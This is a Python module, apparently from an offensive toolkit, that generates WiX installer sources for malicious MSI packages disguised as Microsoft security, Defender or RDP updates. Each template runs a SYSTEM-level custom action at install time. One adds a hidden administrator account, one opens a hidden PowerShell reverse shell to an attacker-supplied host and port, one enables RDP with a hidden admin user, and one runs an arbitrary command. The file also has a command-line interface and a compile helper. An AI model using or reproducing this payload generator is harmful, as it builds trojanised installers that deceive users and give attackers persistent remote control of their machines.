import os
import subprocess
import uuid
from typing import Optional
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import AIEExploitBase


class WixPayload(AIEExploitBase):
    """Generate malicious MSI payloads using WiX Toolset."""

    def __init__(self, output_dir: str = "msi_exploits"):
        """
        Initialize the WiX payload generator.

        Args:
            output_dir: Directory for storing generated payloads
        """
        super().__init__(output_dir)
        self.log("WiX Payload Generator initialized", "SUCCESS")

    def check_wix(self) -> bool:
        """
        Check if WiX Toolset is available.

        Returns:
            True if available, False otherwise
        """
        # Check for candle.exe (WiX compiler)
        result = subprocess.run(
            "where candle.exe" if os.name == 'nt' else "which candle",
            shell=True,
            capture_output=True
        )

        if result.returncode == 0:
            self.log("WiX Toolset found", "SUCCESS")
            return True
        else:
            self.log("WiX Toolset not found", "WARNING")
            self.log("Download from: https://wixtoolset.org/", "INFO")
            return False

    def _generate_guid(self) -> str:
        """Generate a new GUID for WiX."""
        return str(uuid.uuid4()).upper()

    def generate_add_user_template(self, username: str = "hacker",
                                   password: str = "Password123!",
                                   hide_user: bool = True,
                                   output_file: str = None) -> str:
        """
        Generate WiX source for adding an admin user.

        Args:
            username: Username to create
            password: Password for the user
            hide_user: Hide user from login screen
            output_file: Optional output filename

        Returns:
            Path to generated WiX source file
        """
        self.log(f"Generating add-user WiX template...")
        self.log(f"Username: {username}")
        self.log(f"Hidden: {hide_user}")

        # Generate GUIDs
        upgrade_guid = self._generate_guid()
        component_guid = self._generate_guid()

        # Build command
        commands = [
            f'net user {username} {password} /add',
            f'net localgroup administrators {username} /add'
        ]

        if hide_user:
            commands.append(
                f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\'
                f'Winlogon\\SpecialAccounts\\UserList" /v {username} /t REG_DWORD /d 0 /f'
            )

        full_command = ' && '.join(commands)

        template = f'''<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" 
           Name="Windows Security Update" 
           Language="1033" 
           Version="1.0.0.0" 
           Manufacturer="Microsoft Corporation" 
           UpgradeCode="{{{upgrade_guid}}}">

    <Package InstallerVersion="200" 
             Compressed="yes" 
             InstallScope="perMachine"
             Description="Windows Security Update KB5001234"
             Comments="Critical Security Update" />

    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate EmbedCab="yes" />

    <Feature Id="ProductFeature" Title="Setup" Level="1">
      <ComponentRef Id="MainComponent" />
    </Feature>

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="WindowsUpdate">
          <Component Id="MainComponent" Guid="{{{component_guid}}}">
            <CreateFolder />
            <RemoveFolder Id="RemoveInstallFolder" On="uninstall" />
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <CustomAction Id="AddUserAction" 
                  Directory="INSTALLFOLDER"
                  ExeCommand='cmd.exe /c "{full_command}"'
                  Execute="deferred"
                  Return="ignore"
                  Impersonate="no" />

    <InstallExecuteSequence>
      <Custom Action="AddUserAction" Before="InstallFinalize">
        NOT Installed
      </Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
'''

        if not output_file:
            output_file = f"add_user_{username}.wxs"

        output_path = self.output_dir / output_file

        with open(output_path, 'w') as f:
            f.write(template)

        self.log(f"WiX source saved: {output_path}", "SUCCESS")
        self._print_compile_instructions(output_path)

        return str(output_path)

    def generate_reverse_shell_template(self, lhost: str, lport: int,
                                        output_file: str = None) -> str:
        """
        Generate WiX source for a PowerShell reverse shell.

        Args:
            lhost: Attacker IP address
            lport: Attacker listening port
            output_file: Optional output filename

        Returns:
            Path to generated WiX source file
        """
        self.log(f"Generating reverse shell WiX template...")
        self.log(f"LHOST: {lhost}")
        self.log(f"LPORT: {lport}")

        upgrade_guid = self._generate_guid()
        component_guid = self._generate_guid()

        # PowerShell reverse shell (encoded to avoid issues)
        ps_command = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()"
        )

        template = f'''<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" 
           Name="Windows Defender Update" 
           Language="1033" 
           Version="1.0.0.0" 
           Manufacturer="Microsoft Corporation" 
           UpgradeCode="{{{upgrade_guid}}}">

    <Package InstallerVersion="200" 
             Compressed="yes" 
             InstallScope="perMachine" />

    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate EmbedCab="yes" />

    <Feature Id="ProductFeature" Title="Setup" Level="1">
      <ComponentRef Id="MainComponent" />
    </Feature>

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="DefenderUpdate">
          <Component Id="MainComponent" Guid="{{{component_guid}}}">
            <CreateFolder />
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <CustomAction Id="ReverseShell" 
                  Directory="INSTALLFOLDER"
                  ExeCommand='powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "{ps_command}"'
                  Execute="deferred"
                  Return="asyncNoWait"
                  Impersonate="no" />

    <InstallExecuteSequence>
      <Custom Action="ReverseShell" Before="InstallFinalize">
        NOT Installed
      </Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
'''

        if not output_file:
            output_file = f"revshell_{lport}.wxs"

        output_path = self.output_dir / output_file

        with open(output_path, 'w') as f:
            f.write(template)

        self.log(f"WiX source saved: {output_path}", "SUCCESS")
        self._print_compile_instructions(output_path)

        return str(output_path)

    def generate_enable_rdp_template(self, username: str = "rdpuser",
                                     password: str = "RDPPass123!",
                                     output_file: str = None) -> str:
        """
        Generate WiX source for enabling RDP and creating a user.

        Args:
            username: Username to create
            password: Password for the user
            output_file: Optional output filename

        Returns:
            Path to generated WiX source file
        """
        self.log(f"Generating enable-RDP WiX template...")

        upgrade_guid = self._generate_guid()
        component_guid = self._generate_guid()

        commands = [
            # Enable RDP
            'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" '
            '/v fDenyTSConnections /t REG_DWORD /d 0 /f',
            # Firewall rule
            'netsh advfirewall firewall set rule group="remote desktop" new enable=yes',
            # Create user
            f'net user {username} {password} /add',
            f'net localgroup administrators {username} /add',
            f'net localgroup "Remote Desktop Users" {username} /add',
            # Hide user
            f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\'
            f'Winlogon\\SpecialAccounts\\UserList" /v {username} /t REG_DWORD /d 0 /f'
        ]

        full_command = ' && '.join(commands)

        template = f'''<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" 
           Name="Remote Desktop Services Update" 
           Language="1033" 
           Version="1.0.0.0" 
           Manufacturer="Microsoft Corporation" 
           UpgradeCode="{{{upgrade_guid}}}">

    <Package InstallerVersion="200" 
             Compressed="yes" 
             InstallScope="perMachine" />

    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate EmbedCab="yes" />

    <Feature Id="ProductFeature" Title="Setup" Level="1">
      <ComponentRef Id="MainComponent" />
    </Feature>

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="RDPUpdate">
          <Component Id="MainComponent" Guid="{{{component_guid}}}">
            <CreateFolder />
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <CustomAction Id="EnableRDP" 
                  Directory="INSTALLFOLDER"
                  ExeCommand='cmd.exe /c "{full_command}"'
                  Execute="deferred"
                  Return="ignore"
                  Impersonate="no" />

    <InstallExecuteSequence>
      <Custom Action="EnableRDP" Before="InstallFinalize">
        NOT Installed
      </Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
'''

        if not output_file:
            output_file = f"enable_rdp_{username}.wxs"

        output_path = self.output_dir / output_file

        with open(output_path, 'w') as f:
            f.write(template)

        self.log(f"WiX source saved: {output_path}", "SUCCESS")
        self._print_compile_instructions(output_path)

        return str(output_path)

    def generate_custom_command_template(self, command: str,
                                         output_file: str = None) -> str:
        """
        Generate WiX source for a custom command.

        Args:
            command: Command to execute
            output_file: Optional output filename

        Returns:
            Path to generated WiX source file
        """
        self.log(f"Generating custom command WiX template...")
        self.log(f"Command: {command}")

        upgrade_guid = self._generate_guid()
        component_guid = self._generate_guid()

        template = f'''<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" 
           Name="Windows Update" 
           Language="1033" 
           Version="1.0.0.0" 
           Manufacturer="Microsoft Corporation" 
           UpgradeCode="{{{upgrade_guid}}}">

    <Package InstallerVersion="200" 
             Compressed="yes" 
             InstallScope="perMachine" />

    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate EmbedCab="yes" />

    <Feature Id="ProductFeature" Title="Setup" Level="1">
      <ComponentRef Id="MainComponent" />
    </Feature>

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="Update">
          <Component Id="MainComponent" Guid="{{{component_guid}}}">
            <CreateFolder />
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <CustomAction Id="CustomCmd" 
                  Directory="INSTALLFOLDER"
                  ExeCommand='cmd.exe /c "{command}"'
                  Execute="deferred"
                  Return="ignore"
                  Impersonate="no" />

    <InstallExecuteSequence>
      <Custom Action="CustomCmd" Before="InstallFinalize">
        NOT Installed
      </Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
'''

        if not output_file:
            output_file = "custom_cmd.wxs"

        output_path = self.output_dir / output_file

        with open(output_path, 'w') as f:
            f.write(template)

        self.log(f"WiX source saved: {output_path}", "SUCCESS")
        self._print_compile_instructions(output_path)

        return str(output_path)

    def _print_compile_instructions(self, wxs_path: Path) -> None:
        """Print WiX compilation instructions."""
        wxs_name = Path(wxs_path).stem

        print("\n" + "-" * 50)
        print("WiX COMPILATION INSTRUCTIONS")
        print("-" * 50)
        print(f"\n1. Compile WiX source:")
        print(f"   candle.exe {wxs_path}")
        print(f"\n2. Link to create MSI:")
        print(f"   light.exe {wxs_name}.wixobj -o {wxs_name}.msi")
        print(f"\n3. Or in one command:")
        print(f"   candle.exe {wxs_path} && light.exe {wxs_name}.wixobj -o {wxs_name}.msi")
        print("-" * 50)

    def compile_wxs(self, wxs_path: str) -> Optional[str]:
        """
        Compile a WiX source file to MSI.

        Args:
            wxs_path: Path to WiX source file

        Returns:
            Path to compiled MSI or None on failure
        """
        if not self.check_wix():
            return None

        wxs_path = Path(wxs_path)
        wixobj_path = wxs_path.with_suffix('.wixobj')
        msi_path = self.output_dir / wxs_path.with_suffix('.msi').name

        self.log(f"Compiling: {wxs_path}")

        # Compile
        result = self.run_command(f'candle.exe "{wxs_path}" -o "{wixobj_path}"')

        if result.returncode != 0:
            self.log("Compilation failed", "ERROR")
            return None

        # Link
        result = self.run_command(f'light.exe "{wixobj_path}" -o "{msi_path}"')

        if result.returncode == 0 and msi_path.exists():
            self.log(f"MSI created: {msi_path}", "SUCCESS")
            return str(msi_path)
        else:
            self.log("Linking failed", "ERROR")
            return None


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="WiX MSI Payload Generator")
    parser.add_argument('--type', '-t',
                        choices=['add_user', 'reverse_shell', 'enable_rdp', 'custom'],
                        help='Payload type')
    parser.add_argument('--username', '-u', type=str, default='hacker',
                        help='Username for add_user/enable_rdp')
    parser.add_argument('--password', '-p', type=str, default='Password123!',
                        help='Password for new user')
    parser.add_argument('--lhost', type=str,
                        help='LHOST for reverse shell')
    parser.add_argument('--lport', type=int,
                        help='LPORT for reverse shell')
    parser.add_argument('--command', '-c', type=str,
                        help='Command for custom payload')
    parser.add_argument('--output', '-o', type=str,
                        help='Output filename')
    parser.add_argument('--compile', type=str,
                        help='Compile a WiX source file')

    args = parser.parse_args()

    generator = WixPayload()

    if args.compile:
        generator.compile_wxs(args.compile)

    elif args.type == 'add_user':
        generator.generate_add_user_template(
            args.username, args.password, output_file=args.output
        )

    elif args.type == 'reverse_shell':
        if not args.lhost or not args.lport:
            print("[-] --lhost and --lport required")
        else:
            generator.generate_reverse_shell_template(
                args.lhost, args.lport, args.output
            )

    elif args.type == 'enable_rdp':
        generator.generate_enable_rdp_template(
            args.username, args.password, args.output
        )

    elif args.type == 'custom':
        if not args.command:
            print("[-] --command required")
        else:
            generator.generate_custom_command_template(args.command, args.output)

    else:
        parser.print_help()